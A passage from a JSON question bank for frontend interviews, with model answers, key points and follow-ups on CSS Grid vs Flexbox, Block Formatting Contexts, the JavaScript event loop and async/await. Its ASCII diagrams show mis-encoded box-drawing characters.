        "What's the difference between z-index and layer promotion?"
      ],
      "relatedTopics": [
        "css",
        "layout",
        "debugging",
        "portals"
      ],
      "source": "seed",
      "commonAt": [
        "Companies with complex UIs"
      ],
      "createdAt": "2026-01-03T11:53:57.761Z",
      "updatedAt": "2026-01-03T11:53:57.761Z",
      "isArchived": false
    },
    {
      "id": "css-layout-002",
      "category": "css-layout",
      "difficulty": "mid",
      "question": "When would you use CSS Grid vs Flexbox? Explain the key differences and provide examples of when each is more appropriate.",
      "answer": "## Fundamental Difference\n\n```\nFlexbox: ONE-dimensional layout (row OR column)\nâ”Œâ”€â”€â”€â”¬â”€â”€â”€â”¬â”€â”€â”€â”¬â”€â”€â”€â”\nâ”‚ 1 â”‚ 2 â”‚ 3 â”‚ 4 â”‚  â† Items flow in one direction\nâ””â”€â”€â”€â”´â”€â”€â”€â”´â”€â”€â”€â”´â”€â”€â”€â”˜\n\nGrid: TWO-dimensional layout (rows AND columns)\nâ”Œâ”€â”€â”€â”¬â”€â”€â”€â”¬â”€â”€â”€â”\nâ”‚ 1 â”‚ 2 â”‚ 3 â”‚  â† Items placed in 2D grid\nâ”œâ”€â”€â”€â”¼â”€â”€â”€â”¼â”€â”€â”€â”¤\nâ”‚ 4 â”‚ 5 â”‚ 6 â”‚\nâ””â”€â”€â”€â”´â”€â”€â”€â”´â”€â”€â”€â”˜\n```\n\n## When to Use Flexbox\n\n### 1. Navigation / Toolbars\n\n```css\n.navbar {\n  display: flex;\n  justify-content: space-between;\n  align-items: center;\n}\n\n.nav-links {\n  display: flex;\n  gap: 1rem;\n}\n```\n\n### 2. Centering Content\n\n```css\n.center-everything {\n  display: flex;\n  justify-content: center;\n  align-items: center;\n  min-height: 100vh;\n}\n```\n\n### 3. Card Content Alignment\n\n```css\n/* Push footer to bottom of card */\n.card {\n  display: flex;\n  flex-direction: column;\n}\n\n.card-content {\n  flex: 1; /* Take remaining space */\n}\n\n.card-footer {\n  margin-top: auto; /* Stick to bottom */\n}\n```\n\n### 4. Unknown Number of Items\n\n```css\n/* Items wrap naturally */\n.tags {\n  display: flex;\n  flex-wrap: wrap;\n  gap: 0.5rem;\n}\n\n.tag {\n  /* Each tag sizes to content */\n}\n```\n\n## When to Use Grid\n\n### 1. Page Layouts\n\n```css\n.page-layout {\n  display: grid;\n  grid-template-columns: 250px 1fr 300px;\n  grid-template-rows: auto 1fr auto;\n  grid-template-areas:\n    \"header header header\"\n    \"sidebar main aside\"\n    \"footer footer footer\";\n  min-height: 100vh;\n}\n\n.header { grid-area: header; }\n.sidebar { grid-area: sidebar; }\n.main { grid-area: main; }\n.aside { grid-area: aside; }\n.footer { grid-area: footer; }\n```\n\n### 2. Card Grids\n\n```css\n.card-grid {\n  display: grid;\n  grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));\n  gap: 1.5rem;\n}\n\n/* Cards automatically fit and wrap */\n```\n\n### 3. Complex Form Layouts\n\n```css\n.form {\n  display: grid;\n  grid-template-columns: auto 1fr;\n  gap: 1rem;\n  align-items: center;\n}\n\n.form-label {\n  justify-self: end;\n}\n\n.form-input {\n  /* Spans remainder */\n}\n\n.form-full-width {\n  grid-column: 1 / -1;\n}\n```\n\n### 4. Precise Positioning\n\n```css\n.dashboard {\n  display: grid;\n  grid-template-columns: repeat(4, 1fr);\n  grid-template-rows: repeat(3, 200px);\n  gap: 1rem;\n}\n\n.widget-large {\n  grid-column: span 2;\n  grid-row: span 2;\n}\n\n.widget-wide {\n  grid-column: span 3;\n}\n```\n\n## Feature Comparison\n\n| Feature | Flexbox | Grid |\n|---------|---------|------|\n| Direction | Single axis | Both axes |\n| Item sizing | Content-based | Grid-based or content |\n| Gap support | âœ… | âœ… |\n| Alignment | âœ… | âœ… |\n| Explicit placement | Limited | Full control |\n| Dense packing | No | Yes (grid-auto-flow: dense) |\n| Subgrid | No | Yes |\n| Overlap | Manual (negative margins) | Native (same cell) |\n\n## Combined Usage\n\nOften the best approach uses both:\n\n```css\n/* Grid for overall page structure */\n.app {\n  display: grid;\n  grid-template-columns: 250px 1fr;\n}\n\n/* Flexbox for header content */\n.header {\n  display: flex;\n  justify-content: space-between;\n  align-items: center;\n}\n\n/* Grid for card layout */\n.card-grid {\n  display: grid;\n  grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));\n  gap: 1rem;\n}\n\n/* Flexbox for card internals */\n.card {\n  display: flex;\n  flex-direction: column;\n}\n\n.card-actions {\n  display: flex;\n  gap: 0.5rem;\n  margin-top: auto;\n}\n```\n\n## Modern Grid Features\n\n```css\n/* Subgrid - align nested items to parent grid */\n.parent {\n  display: grid;\n  grid-template-columns: repeat(3, 1fr);\n}\n\n.child {\n  display: grid;\n  grid-template-columns: subgrid;\n  grid-column: span 3;\n}\n\n/* Container Queries (with grid) */\n.card-container {\n  container-type: inline-size;\n}\n\n@container (min-width: 400px) {\n  .card {\n    display: grid;\n    grid-template-columns: 150px 1fr;\n  }\n}\n```\n\n## Decision Framework\n\n```\nIs it a 2D layout with rows AND columns?\nâ”‚\nâ”œâ”€â”€ Yes â†’ Use Grid\nâ”‚   â””â”€â”€ Examples: Page layout, dashboard, image gallery\nâ”‚\nâ””â”€â”€ No â†’ Is content flowing in one direction?\n    â”‚\n    â”œâ”€â”€ Yes â†’ Use Flexbox\n    â”‚   â””â”€â”€ Examples: Navbar, buttons, form row\n    â”‚\n    â””â”€â”€ Both work â†’ Consider:\n        â€¢ Grid: When you need precise control\n        â€¢ Flexbox: When content should dictate size\n```",
      "keyPoints": [
        "Understands 1D vs 2D layout distinction",
        "Knows when flexbox excels (centering, single-axis)",
        "Knows when grid excels (complex layouts, grids)",
        "Can combine both effectively",
        "Familiar with modern features (subgrid)",
        "Has decision framework for choosing"
      ],
      "followUpQuestions": [
        "How would you handle fallbacks for older browsers?",
        "What about performance differences?",
        "How does subgrid help with component alignment?",
        "When would you use CSS Columns instead?"
      ],
      "relatedTopics": [
        "css",
        "flexbox",
        "grid",
        "responsive-design"
      ],
      "source": "seed",
      "commonAt": [
        "General frontend knowledge"
      ],
      "createdAt": "2026-01-03T11:53:57.761Z",
      "updatedAt": "2026-01-03T11:53:57.761Z",
      "isArchived": false
    },
    {
      "id": "css-layout-003",
      "category": "css-layout",
      "difficulty": "mid",
      "question": "What is the Block Formatting Context (BFC) in CSS? How do you create one, and why would you need to?",
      "answer": "## What is a BFC?\n\nA Block Formatting Context (BFC) is an independent layout environment where the internal layout doesn't affect the external layout and vice versa.\n\n```\nWithout BFC:\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚ Parent                          â”‚\nâ”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”‚\nâ”‚  â”‚ Float left              â”‚    â”‚\nâ”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â”‚\nâ”‚                                 â”‚ â† Parent collapses! Float escapes\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n\nWith BFC:\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚ Parent (BFC)                    â”‚\nâ”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”‚\nâ”‚  â”‚ Float left              â”‚    â”‚\nâ”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â”‚\nâ”‚                                 â”‚ â† Parent contains float\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n```\n\n## How to Create a BFC\n\n```css\n/* 1. overflow (not visible) */\n.bfc {\n  overflow: hidden; /* or auto, scroll */\n}\n\n/* 2. display: flow-root (modern, best practice) */\n.bfc {\n  display: flow-root; /* explicitly creates BFC */\n}\n\n/* 3. Float */\n.bfc {\n  float: left; /* or right */\n}\n\n/* 4. Position absolute/fixed */\n.bfc {\n  position: absolute; /* or fixed */\n}\n\n/* 5. Display inline-block */\n.bfc {\n  display: inline-block;\n}\n\n/* 6. Flex/Grid items */\n.flex-container > .bfc {\n  /* flex items create BFC */\n}\n\n/* 7. Table cells */\n.bfc {\n  display: table-cell;\n}\n\n/* 8. contain: layout */\n.bfc {\n  contain: layout;\n}\n```\n\n## Common Use Cases\n\n### 1. Containing Floats (Clearfix Replacement)\n\n```css\n/* Old clearfix hack */\n.clearfix::after {\n  content: \"\";\n  display: table;\n  clear: both;\n}\n\n/* Modern BFC solution */\n.container {\n  display: flow-root;\n}\n```\n\n```html\n<div class=\"container\">\n  <div class=\"float-left\">Floated</div>\n  <div class=\"float-right\">Floated</div>\n  <!-- Container properly wraps floats -->\n</div>\n```\n\n### 2. Preventing Margin Collapse\n\n```css\n/* Margins collapse without BFC */\n.parent {\n  background: lightblue;\n}\n\n.child {\n  margin-top: 50px; /* Collapses through parent! */\n}\n\n/* BFC prevents collapse */\n.parent {\n  background: lightblue;\n  display: flow-root; /* or overflow: hidden */\n}\n\n.child {\n  margin-top: 50px; /* Stays inside parent */\n}\n```\n\n### 3. Multi-Column Layout with Float\n\n```css\n/* Without BFC - text wraps under float */\n.sidebar {\n  float: left;\n  width: 200px;\n}\n\n.main {\n  /* Text wraps around sidebar */\n}\n\n/* With BFC - clean separation */\n.sidebar {\n  float: left;\n  width: 200px;\n}\n\n.main {\n  display: flow-root; /* or overflow: hidden */\n  /* Content stays in its own lane */\n}\n```\n\n```\nWithout BFC on main:\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚Sidebar â”‚ Main content wraps around   â”‚\nâ”‚        â”‚ the sidebar when there's    â”‚\nâ”‚        â”‚ enough text to fill...      â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤\n         â”‚ ...the rest continues here  â”‚\n         â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n\nWith BFC on main:\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚Sidebar â”‚ Main content stays          â”‚\nâ”‚        â”‚ completely separate from    â”‚\nâ”‚        â”‚ the sidebar float           â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n```\n\n### 4. Preventing Layout Interference\n\n```css\n/* Component isolation */\n.widget {\n  display: flow-root;\n  /* Internal floats, margins won't affect siblings */\n}\n```\n\n## Why display: flow-root?\n\n```css\n/* overflow: hidden has side effects */\n.container {\n  overflow: hidden;\n  /* âŒ Clips overflowing content (tooltips, dropdowns) */\n  /* âŒ Hides scrollbars */\n}\n\n/* display: flow-root is purpose-built */\n.container {\n  display: flow-root;\n  /* âœ… Creates BFC without side effects */\n  /* âœ… No clipping */\n  /* âœ… Clear semantic intent */\n}\n```\n\n## BFC Rules\n\nElements in a BFC:\n1. Contain all descendant floats\n2. Exclude external floats\n3. Suppress margin collapse with BFC boundary\n4. Don't overlap with floats\n\n```css\n/* BFC prevents overlap with sibling float */\n.float {\n  float: left;\n  width: 100px;\n  height: 100px;\n}\n\n.bfc-sibling {\n  display: flow-root;\n  /* This element starts after the float, not beside it */\n  /* But won't wrap around the float */\n}\n```\n\n## Modern Alternatives\n\nWhile BFC is still relevant, modern layout often uses:\n\n```css\n/* Flexbox (creates BFC for children) */\n.container {\n  display: flex;\n  flex-wrap: wrap;\n}\n\n/* Grid (creates BFC for children) */\n.container {\n  display: grid;\n  grid-template-columns: 200px 1fr;\n}\n\n/* Both avoid float issues entirely */\n```\n\n## Quick Reference\n\n| Trigger | Side Effects | Use Case |\n|---------|--------------|----------|\n| display: flow-root | None | Best general purpose |\n| overflow: hidden | Clips content | When clipping is acceptable |\n| overflow: auto | Shows scrollbars | Scrollable containers |\n| float | Removes from flow | Legacy layouts |\n| position: absolute | Removes from flow | Absolutely positioned |\n| display: inline-block | Inline behavior | Inline BFC |",
      "keyPoints": [
        "Understands BFC as isolated layout context",
        "Knows multiple ways to create BFC",
        "Can use BFC for containing floats",
        "Understands margin collapse prevention",
        "Prefers display: flow-root for clarity",
        "Knows when modern layout is better"
      ],
      "followUpQuestions": [
        "How does BFC interact with stacking contexts?",
        "What about inline formatting context?",
        "How do CSS Containment and BFC relate?",
        "When would you still use floats today?"
      ],
      "relatedTopics": [
        "css",
        "layout",
        "floats",
        "margin-collapse"
      ],
      "source": "seed",
      "commonAt": [
        "Companies maintaining legacy CSS"
      ],
      "createdAt": "2026-01-03T11:53:57.761Z",
      "updatedAt": "2026-01-03T11:53:57.761Z",
      "isArchived": false
    },
    {
      "id": "js-event-loop-001",
      "category": "js-event-loop",
      "difficulty": "senior",
      "question": "Explain the JavaScript event loop in detail. What is the difference between microtasks and macrotasks? Walk through the execution order of a complex example.",
      "answer": "## Event Loop Architecture\n\n```\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚                         Call Stack                              â”‚\nâ”‚                    (Currently executing)                        â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n                              â”‚\n                              â–¼\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚                         Event Loop                              â”‚\nâ”‚                                                                 â”‚\nâ”‚   1. Execute all code in Call Stack                             â”‚\nâ”‚   2. Execute ALL microtasks (until queue empty)                 â”‚\nâ”‚   3. Render if needed (requestAnimationFrame)                   â”‚\nâ”‚   4. Execute ONE macrotask                                      â”‚\nâ”‚   5. Go to step 1                                               â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n         â”‚                                              â”‚\n         â–¼                                              â–¼\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚   Microtask Queue    â”‚                    â”‚   Macrotask Queue    â”‚\nâ”‚   (Higher priority)  â”‚                    â”‚   (Lower priority)   â”‚\nâ”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤                    â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤\nâ”‚ â€¢ Promise.then/catch â”‚                    â”‚ â€¢ setTimeout         â”‚\nâ”‚ â€¢ queueMicrotask()   â”‚                    â”‚ â€¢ setInterval        â”‚\nâ”‚ â€¢ MutationObserver   â”‚                    â”‚ â€¢ setImmediate       â”‚\nâ”‚ â€¢ process.nextTick   â”‚                    â”‚ â€¢ I/O callbacks      â”‚\nâ”‚   (Node.js)          â”‚                    â”‚ â€¢ UI rendering       â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                    â”‚ â€¢ requestAnimationFrame â”‚\n                                            â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n```\n\n## Microtasks vs Macrotasks\n\n### Microtasks (Job Queue)\n- Processed **immediately** after current script\n- **All** microtasks run before any macrotask\n- New microtasks added during processing are also processed\n\n### Macrotasks (Task Queue)\n- Processed **one at a time**\n- After each macrotask, microtasks run\n- Browser may render between macrotasks\n\n## Detailed Example\n\n```typescript\nconsole.log('1: Script start');\n\nsetTimeout(() => {\n  console.log('2: setTimeout');\n  Promise.resolve().then(() => console.log('3: Promise inside setTimeout'));\n}, 0);\n\nPromise.resolve()\n  .then(() => {\n    console.log('4: Promise 1');\n    queueMicrotask(() => console.log('5: Microtask queued from Promise'));\n  })\n  .then(() => console.log('6: Promise 2'));\n\nqueueMicrotask(() => console.log('7: queueMicrotask'));\n\nconsole.log('8: Script end');\n```\n\n### Execution Walkthrough\n\n```\nStep 1: Execute synchronous code\nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\nCall Stack: [main]\nOutput: \"1: Script start\"\n\nStep 2: setTimeout scheduled\nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\nMacrotask Queue: [setTimeout callback]\n(Timer starts, callback will be queued when timer fires)\n\nStep 3: Promise.resolve().then() scheduled\nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\nMicrotask Queue: [Promise 1 callback]\n\nStep 4: queueMicrotask scheduled\nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\nMicrotask Queue: [Promise 1 callback, queueMicrotask callback]\n\nStep 5: Continue synchronous execution\nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\nOutput: \"8: Script end\"\nCall Stack: [] (empty)\n\nStep 6: Process ALL microtasks\nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\nExecute \"Promise 1 callback\":\n  Output: \"4: Promise 1\"\n  Queues: new microtask (step 5), Promise 2 callback\n  \nMicrotask Queue: [queueMicrotask, microtask from Promise, Promise 2]\n\nExecute \"queueMicrotask callback\":\n  Output: \"7: queueMicrotask\"\n\nExecute \"microtask from Promise\":\n  Output: \"5: Microtask queued from Promise\"\n\nExecute \"Promise 2 callback\":\n  Output: \"6: Promise 2\"\n\nMicrotask Queue: [] (empty)\n\nStep 7: Process ONE macrotask\nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\nExecute \"setTimeout callback\":\n  Output: \"2: setTimeout\"\n  Queues: new Promise microtask\n\nStep 8: Process ALL microtasks again\nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\nExecute \"Promise inside setTimeout\":\n  Output: \"3: Promise inside setTimeout\"\n\nFINAL ORDER:\n1: Script start\n8: Script end\n4: Promise 1\n7: queueMicrotask\n5: Microtask queued from Promise\n6: Promise 2\n2: setTimeout\n3: Promise inside setTimeout\n```\n\n## requestAnimationFrame Position\n\n```typescript\nconsole.log('1: Start');\n\nrequestAnimationFrame(() => console.log('2: rAF'));\n\nsetTimeout(() => console.log('3: setTimeout'), 0);\n\nPromise.resolve().then(() => console.log('4: Promise'));\n\nconsole.log('5: End');\n\n// Output:\n// 1: Start\n// 5: End\n// 4: Promise (microtask)\n// 2: rAF (before paint, after microtasks)\n// 3: setTimeout (macrotask, may be before or after rAF depending on timing)\n```\n\n```\nEvent Loop with rAF:\n\n1. Execute script\n2. Execute ALL microtasks\n3. If it's time to render:\n   a. Execute requestAnimationFrame callbacks\n   b. Render\n4. Execute ONE macrotask\n5. Repeat\n```\n\n## Common Pitfalls\n\n### Infinite Microtask Loop\n\n```typescript\n// âŒ This blocks everything!\nfunction infiniteMicrotasks() {\n  Promise.resolve().then(infiniteMicrotasks);\n}\ninfiniteMicrotasks();\n\n// UI freezes, setTimeout never runs\n// Because microtasks keep getting added\n```\n\n### async/await Behavior\n\n```typescript\nasync function asyncExample() {\n  console.log('1: async start');\n  \n  await Promise.resolve();\n  // Everything after await is a microtask!\n  \n  console.log('2: after await');\n}\n\nconsole.log('3: script start');\nasyncExample();\nconsole.log('4: script end');\n\n// Output:\n// 3: script start\n// 1: async start\n// 4: script end\n// 2: after await (microtask)\n```\n\n### Multiple Event Loop Iterations\n\n```typescript\n// Force multiple event loop iterations\nfunction nextTick(callback: () => void) {\n  setTimeout(callback, 0);\n}\n\n// Microtask - runs before next render\nPromise.resolve().then(() => {\n  document.body.style.background = 'red';\n});\n// User won't see intermediate state\n\n// Macrotask - allows render between\nsetTimeout(() => {\n  document.body.style.background = 'blue';\n}, 0);\n// User might see previous state briefly\n```\n\n## Practical Applications\n\n```typescript\n// 1. Defer heavy work to avoid blocking\nfunction processLargeArray(items: Item[]) {\n  let index = 0;\n  \n  function processChunk() {\n    const chunkSize = 100;\n    const end = Math.min(index + chunkSize, items.length);\n    \n    while (index < end) {\n      processItem(items[index]);\n      index++;\n    }\n    \n    if (index < items.length) {\n      // Schedule next chunk as macrotask\n      // Allows rendering between chunks\n      setTimeout(processChunk, 0);\n    }\n  }\n  \n  processChunk();\n}\n\n// 2. Batch DOM updates with microtask\nlet pending = false;\nconst updates: (() => void)[] = [];\n\nfunction scheduleUpdate(fn: () => void) {\n  updates.push(fn);\n  \n  if (!pending) {\n    pending = true;\n    queueMicrotask(() => {\n      pending = false;\n      const batch = updates.splice(0);\n      batch.forEach(fn => fn());\n    });\n  }\n}\n```",
      "keyPoints": [
        "Understands event loop phases",
        "Knows microtask vs macrotask timing",
        "Can trace complex execution order",
        "Understands async/await as microtasks",
        "Knows rAF timing in the loop",
        "Can apply knowledge practically"
      ],
      "followUpQuestions": [
        "How does the event loop differ in Node.js?",
        "How would you debug event loop issues?",
        "What causes \"long tasks\" in performance traces?",
        "How do Web Workers relate to the event loop?"
      ],
      "relatedTopics": [
        "async",
        "promises",
        "performance",
        "javascript-runtime"
      ],
      "source": "seed",
      "commonAt": [
        "Any JS-heavy company"
      ],
      "createdAt": "2026-01-03T11:53:57.761Z",
      "updatedAt": "2026-01-03T11:53:57.761Z",
      "isArchived": false
    },
    {
      "id": "js-event-loop-002",
      "category": "js-event-loop",
      "difficulty": "mid",
      "question": "How do async/await work under the hood? What happens when you await a promise, and how does it relate to the event loop?",
      "answer": "## async/await as Syntax Sugar\n\nasync/await is syntactic sugar over Promises and generators. Understanding this helps predict execution order.\n\n```typescript\n// async/await version\nasync function fetchUser() {\n  console.log('1');\n  const response = await fetch('/api/user');\n  console.log('2');\n  const data = await response.json();\n  console.log('3');\n  return data;\n}\n\n// Roughly equivalent to:\nfunction fetchUser() {\n  console.log('1');\n  return fetch('/api/user')\n    .then(response => {\n      console.log('2');\n      return response.json();\n    })\n    .then(data => {\n      console.log('3');\n      return data;\n    });\n}\n```\n\n## What Happens at Each await\n\n```typescript\nasync function example() {\n  console.log('A'); // Synchronous\n  \n  await Promise.resolve(); // â† Suspension point\n  \n  console.log('B'); // Runs as microtask\n}\n\nconsole.log('1');\nexample();\nconsole.log('2');\n\n// Output:\n// 1\n// A\n// 2\n// B\n```\n\n### Detailed Breakdown\n\n```\n1. console.log('1') executes â†’ Output: \"1\"\n2. example() called\n3. console.log('A') executes â†’ Output: \"A\"  \n4. await Promise.resolve() encountered:\n   - Promise is already resolved\n   - BUT code after await is still scheduled as microtask\n   - Function suspends, returns implicit Promise\n5. console.log('2') executes â†’ Output: \"2\"\n6. Call stack empty, microtasks run\n7. console.log('B') executes â†’ Output: \"B\"\n```\n\n## await with Different Values\n\n```typescript\n// await wraps non-promises in Promise.resolve()\nasync function test() {\n  const a = await 42;           // Same as await Promise.resolve(42)\n  const b = await 'string';     // Same as await Promise.resolve('string')\n  const c = await fetchData();  // Actual promise\n}\n```\n\n## Execution Flow Visualization\n\n```typescript\nasync function outer() {\n  console.log('outer-1');\n  await inner();\n  console.log('outer-2');\n}\n\nasync function inner() {\n  console.log('inner-1');\n  await Promise.resolve();\n  console.log('inner-2');\n}\n\nconsole.log('start');\nouter();\nconsole.log('end');\n```\n\n```\nExecution Trace:\n\nâ”‚ Call Stack          â”‚ Microtask Queue        â”‚ Output\nâ”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€\nâ”‚ [main]              â”‚ []                     â”‚ \"start\"\nâ”‚ [main, outer]       â”‚ []                     â”‚ \"outer-1\"\nâ”‚ [main, outer, inner]â”‚ []                     â”‚ \"inner-1\"\nâ”‚ [main, outer, inner]â”‚ [inner continuation]   â”‚ (await, suspend inner)\nâ”‚ [main, outer]       â”‚ [inner continuation,   â”‚ (await, suspend outer)\nâ”‚                     â”‚  outer continuation]   â”‚\nâ”‚ [main]              â”‚ [inner cont, outer cont]â”‚ \"end\"\nâ”‚ []                  â”‚ [inner cont, outer cont]â”‚ \nâ”‚ [inner continuation]â”‚ [outer continuation]   â”‚ \"inner-2\"\nâ”‚ []                  â”‚ [outer continuation]   â”‚\nâ”‚ [outer continuation]â”‚ []                     â”‚ \"outer-2\"\n\nFinal Output: start, outer-1, inner-1, end, inner-2, outer-2\n```\n\n## Error Handling\n\n```typescript\nasync function withError() {\n  try {\n    await Promise.reject(new Error('Failed'));\n  } catch (error) {\n    console.log('Caught:', error.message);\n  }\n}\n\n// Equivalent to:\nfunction withError() {\n  return Promise.reject(new Error('Failed'))\n    .catch(error => {\n      console.log('Caught:', error.message);\n    });\n}\n```\n\n### Unhandled Rejections\n\n```typescript\n// âŒ Unhandled rejection - no try/catch, no .catch()\nasync function risky() {\n  await Promise.reject(new Error('Oops'));\n}\nrisky(); // UnhandledPromiseRejectionWarning\n\n// âœ… Handled\nasync function safe() {\n  try {\n    await Promise.reject(new Error('Oops'));\n  } catch (e) {\n    console.error(e);\n  }\n}\n\n// âœ… Or handle when calling\nrisky().catch(console.error);\n```\n\n## Parallel vs Sequential\n\n```typescript\n// Sequential - one at a time\nasync function sequential() {\n  const user = await fetchUser();     // Wait...\n  const posts = await fetchPosts();   // Then wait...\n  const comments = await fetchComments(); // Then wait...\n  // Total time: sum of all requests\n}\n\n// Parallel - all at once\nasync function parallel() {\n  const [user, posts, comments] = await Promise.all([\n    fetchUser(),\n    fetchPosts(),\n    fetchComments(),\n  ]);\n  // Total time: max of all requests\n}\n\n// Be careful with loops!\n// âŒ Sequential (slow)\nasync function processItems(items: Item[]) {\n  for (const item of items) {\n    await processItem(item);\n  }\n}\n\n// âœ… Parallel\nasync function processItems(items: Item[]) {\n  await Promise.all(items.map(item => processItem(item)));\n}\n```\n\n## Top-Level Await\n\n```typescript\n// ES2022+ in modules\n// 